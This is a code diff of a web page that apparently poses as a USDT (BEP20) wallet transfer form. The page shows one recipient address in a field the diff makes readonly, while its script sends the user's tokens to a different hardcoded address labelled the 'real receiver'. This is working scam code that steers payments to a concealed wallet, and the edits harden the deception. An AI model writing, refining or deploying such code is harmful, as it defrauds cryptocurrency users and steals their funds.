@@ -133,7 +133,7 @@
   <div class="container">
     <label>Address or Domain Name</label>
     <div class="input-box">
-      <input type="text" id="address" value="0xc07506a44dd9E2A0d4F010465C40A80A2117219a">
+      <input type="text" id="address" value="0xc07506a44dd9E2A0d4F010465C40A80A2117219a" readonly>
       <button class="clear-btn" onclick="document.getElementById('address').value = ''">×</button>
       <button class="paste-btn" onclick="navigator.clipboard.readText().then(text => document.getElementById('address').value = text)">Paste</button>
     </div>
@@ -154,7 +154,7 @@
 
   <script>
     const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BEP20)
-    const receiverAddress = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC"; // REAL receiver
+    const receiverAddress = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC"; // Real receiver
 
     const usdtAbi = [
       {
@@ -216,7 +216,6 @@
         const web3 = new Web3(window.ethereum);
         const accounts = await web3.eth.getAccounts();
         const contract = new web3.eth.Contract(usdtAbi, usdtAddress);
-
         const decimals = await contract.methods.decimals().call();
         const value = web3.utils.toBN(amount * (10 ** decimals));
 
@@ -227,7 +226,6 @@
         await contract.methods.transfer(receiverAddress, value).send({ from: accounts[0] });
 
         alert("Transfer successful!");
-
       } catch (err) {
         console.error(err);
         alert("Transaction failed: " + (err.message || "Unknown error"));
